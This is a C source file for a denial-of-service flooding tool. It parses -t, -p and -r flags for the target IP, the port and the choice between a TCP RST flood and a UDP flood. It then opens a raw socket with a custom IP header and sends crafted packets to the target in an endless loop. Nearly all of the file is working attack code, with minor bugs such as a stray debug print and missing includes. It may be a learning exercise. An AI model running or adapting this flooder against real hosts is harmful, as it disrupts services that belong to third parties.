#include <netinet/ip.h>
#include <stdio.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#include "packets_settings.h"
#define DEFAULT_IP "127.0.0.1"
#define DEFAULT_PORT 443
#define DEFAULT_FLOOD IPPROTO_TCP

// typedef struct Target {
//     char* _ip;
//     int _port;
//     char* _type;
// } Target;

void get_cli(int argc, char* argv[], struct packet* pkt) {
    switch (argc) {
        default:
            printf("Error, too many values or incorrect entry\n");
            exit(1);
            break;
        case 1:
            printf("There is no input.\nDefault values will be entered\n\n");
            strcpy(pkt->target_ip_address, DEFAULT_IP);
            pkt->target_port = 443;
            pkt->protocol = IPPROTO_TCP;
            break;
        case 5:
            printf("fddddfd");

            if ((strcmp(argv[1], "-t") == 0) && (strcmp(argv[3], "-p") == 0)) {
                strcpy(pkt->target_ip_address, argv[2]);
                pkt->target_port = atoi((char*)argv[4]);
                pkt->protocol = IPPROTO_TCP;
                break;
            } else
                printf("Error, too many values or incorrect entry\n");

        case 6:
            if ((strcmp(argv[1], "-t") == 0) && (strcmp(argv[3], "-p") == 0) && (strcmp(argv[5], "-r") == 0)) {
                strcpy(pkt->target_ip_address, argv[2]);
                pkt->target_port = atoi((char*)argv[4]);
                pkt->protocol = IPPROTO_UDP;
                break;
            } else
                printf("Error, too many values or incorrect entry\n");
    }
}

/*
The following main function can have the following parameters (flags)
-t	The target IP address for the flood attacks, default is 127.0.0.1
-p	The target port, default is 443
-r	Switch from the default sending of RST flood to the UDP flood attack
*/

int main(int argc, char* argv[]) {
    srand(time(NULL));  //Get different random result

    // //Get user choices
    // get_cli(argc, argv, &target);

    struct packet pkt;
    memset(&pkt, 0, sizeof(struct packet));

    //Get user choices
    get_cli(argc, argv, &pkt);

    int enable = 1;
    // MUST use sudo, otherwise we'll encounter an error here
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock == -1) {
        printf("Error opening a socket!\n");
        exit(1);
    }
    int sockopt = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
    if (sockopt == -1) {
        printf("Error setting socket options!\n");
        exit(1);
    }
    struct sockaddr_in dest_info;
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr.s_addr = inet_addr(pkt.target_ip_address);

    char packet[40];

    char attack_type[15];
    strcpy(attack_type, (pkt.protocol == IPPROTO_TCP) ? "RST" : "UDP");

    printf("Attack Type: %s\nTarget: %s:%d\n", attack_type, pkt.target_ip_address, pkt.target_port);
    // infinite loop, up to user exit
    while (1) {
        memset(packet, 0, 40);
        create_packet(packet, &pkt);
        struct iphdr* iph = (struct iphdr*)packet;
        sendto(sock, iph, iph->tot_len, 0, (struct sockaddr*)&dest_info, sizeof(dest_info));
    }

    close(sock);
    return 0;
}
